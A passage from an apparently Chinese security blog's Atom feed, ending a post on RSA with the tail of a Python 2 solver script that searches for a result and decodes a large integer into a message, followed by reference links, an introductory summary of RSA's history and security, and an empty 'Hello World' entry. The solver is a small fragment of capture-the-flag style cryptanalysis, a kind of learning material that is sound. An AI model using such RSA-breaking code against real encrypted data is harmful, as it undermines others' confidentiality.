class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="keyword">True</span>):</div><div class="line">        <span class="keyword">print</span> res</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"i="</span>+str(i)</div><div class="line">    i = i+<span class="number">1</span></div><div class="line"></div><div class="line">m=<span class="number">440721643740967258786371951429849843897639673893942371730874939742481383302887786063966117819631425015196093856646526738786745933078032806737504580146717737115929461581126895844008044713461807791172016433647699394456368658396746134702627548155069403689581548233891848149612485605022294307233116137509171389596747894529765156771462793389236431942344003532140158865426896855377113878133478689191912682550117563858186</span></div><div class="line"><span class="keyword">print</span> n2s(m)</div></pre></td></tr></table></figure>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html</a></p>
<p><a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3058.html</a></p>
<p><a href="http://bestwing.me/2016/09/10/Common%20types%20of%20RSA/" target="_blank" rel="external">http://bestwing.me/2016/09/10/Common%20types%20of%20RSA/</a></p>
<p><a href="http://www.bystudent.com/?p=234" target="_blank" rel="external">http://www.bystudent.com/?p=234</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（AdiShamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年首次公布，当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。&lt;br&gt;RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。&lt;br&gt;RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。&lt;br&gt;RSA的安全性依赖于大数分解，但是否等同于大数分解一直未能得到理论上的证明，因为没有证明破解RSA就一定需要作大数分解。假设存在一种无须分解大数的算法，那它肯定可以修改成为大数分解算法。 RSA 的一些变种算法已被证明等价于大数分解。不管怎样，分解n是最显然的攻击方法。人们已能分解多个十进制位的大素数。因此，模数n必须选大一些，因具体适用情况而定。&lt;/p&gt;
    
    </summary>
    
    
      <category term="RSA" scheme="http://pwnable.me/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://pwnable.me/2017/01/01/hello-world/"/>
    <id>http://pwnable.me/2017/01/01/hello-world/</id>
    <published>2017-01-01T00:58:08.000Z</published>
    <updated>2017-06-04T05:30:08.172Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="Hello" scheme="http://pwnable.me/tags/Hello/"/>
    
  </entry>
  
</feed>
